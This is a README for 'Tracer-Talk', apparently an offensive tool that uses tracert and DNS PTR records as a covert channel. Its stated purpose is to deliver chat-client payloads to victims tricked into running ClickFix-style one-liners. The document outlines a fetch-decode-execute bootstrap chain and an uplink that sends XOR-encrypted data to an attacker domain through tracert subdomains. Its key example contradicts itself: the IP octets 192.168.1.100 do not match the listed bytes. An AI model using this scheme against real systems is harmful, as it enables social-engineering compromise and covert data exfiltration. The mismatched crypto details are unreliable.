# Tracer-Talk Chat Clients

These are the "payloads" delivered via Tracer-Terminal. Each is a minimal chat client that communicates bidirectionally over `tracert`/`traceroute` commands using the Tracer-Talk protocol. All three do the same thing -- pick the one matching the target OS.

| Client | Platform | Size | Dependencies |
|--------|----------|------|-------------|
| `chat_client.ps1` | Windows (PowerShell) | ~1,009 bytes | None (PowerShell is built-in) |
| `chat_client.bat` | Windows (CMD) | ~1,065 bytes | None (uses inline PowerShell for crypto) |
| `chat_client.sh` | Linux / macOS (Bash) | ~1,126 bytes | None (`traceroute`, `grep`, `bash` are standard) |

## How They Get Delivered

The client scripts are never downloaded via HTTP or any traditional method. The delivery chain is:

1. The server pre-encodes the chosen chat client into encrypted hex shards
2. A bootstrap one-liner (from `bootstrap/`) runs `tracert` against the server
3. The server creates fake ICMP hops, each carrying one shard as a PTR hostname
4. The bootstrap extracts the hostnames from `tracert` output, decodes them, and executes the result
5. The chat client starts running

## How the Chat Protocol Works

Once running, each client enters a loop that uses `tracert` for both sending and receiving:

### Sending a Message (Uplink)

```
you: Hello server
```

1. The client XOR-encrypts your message with the 4-byte key (server IP octets)
2. Hex-encodes the encrypted bytes
3. Runs `tracert -h 1 [hex_data].tx.lab.yourdomain.com`
4. The DNS query for that subdomain hits the server via NS delegation
5. The server extracts the hex from the subdomain, XOR-decrypts, and displays the message

The `-h 1` flag makes the uplink tracert complete almost instantly (single hop).

### Receiving a Message (Downlink)

```
server: Hi from the other side
```

1. The client runs `tracert rx.lab.yourdomain.com` (default 30 hops)
2. The server checks its outbox for queued messages
3. If a message is waiting, the ICMP tunnel creates fake hops with PTR hostnames carrying encrypted message shards
4. The client's `tracert` output shows those hostnames
5. The client filters lines matching the domain, strips the suffix, concatenates the hex, XOR-decrypts, and displays the message
6. The client sends an `ack` tracert to confirm receipt

If no message is waiting, the server returns an `empty` marker and the client moves on.

### Commands

- Type a message and press Enter to send
- `/quit` -- sends `end.lab.yourdomain.com` to tear down the session and exits

## Encryption

All three clients use identical crypto:

- **Algorithm**: XOR with 4-byte repeating key
- **Key**: The server IP address octets (e.g., `192.168.1.100` = bytes `[96, 38, 118, 3]`)
- **Encoding**: Hex (0-9, a-f) -- safe for DNS labels

The key is hardcoded in each client script. When the server encodes the payload, the key values in the script match the server's IP.

## Customizing for Your Domain

Each client has two values at the top that must match your server config:

**PowerShell** (`chat_client.ps1`):
```powershell
$Z="lab.yourdomain.com"
$K=[byte[]]@(96,38,118,3)    # your server IP octets
```

**CMD** (`chat_client.bat`):
```batch
set S=192.168.1.100
set Z=lab.yourdomain.com
```
And the `$k=@(...)` arrays inside the PowerShell inline calls on lines 10 and 24.

**Bash** (`chat_client.sh`):
```bash
Z="lab.yourdomain.com"
K=(192 168 1 100)               # your server IP octets
```

In normal operation you don't edit these manually -- the server's shard encoder reads the raw script file and delivers it as-is. You configure the domain and IP in `server/config.py` and the bootstrap + ICMP tunnel handles the rest. You only need to edit the client scripts if you want to test them standalone.

## Size Constraints

Each client must fit within the shard capacity of a single `tracert` run (default 30 hops). With the `lab.mydomain.net` domain:

- ~233 hex chars per hop = ~116 bytes per hop
- 28 usable hops = ~3,248 bytes max
- Conservative (15 usable hops after real internet hops) = ~1,740 bytes

All three clients are well under 1,500 bytes, needing only 5-6 shards each.

## Bootstrap One-Liners

The `bootstrap/` folder contains the "ClickFix-style" one-liners that trigger the initial payload delivery. These are what a victim would be tricked into running:

- `bootstrap_ps.txt` -- PowerShell one-liner (446 bytes). Works from CMD via `powershell -c` or directly in PowerShell.
- `bootstrap_cmd.txt` -- CMD one-liner (432 bytes). Runs `tracert` from CMD, then calls PowerShell inline for decoding.
- `bootstrap_bash.txt` -- Bash one-liner (288 bytes). Uses `traceroute`, `grep`, `printf` for decode.

Each one-liner performs: `tracert payload.lab.domain.com` | filter shard hostnames | hex decode | XOR decrypt | execute.
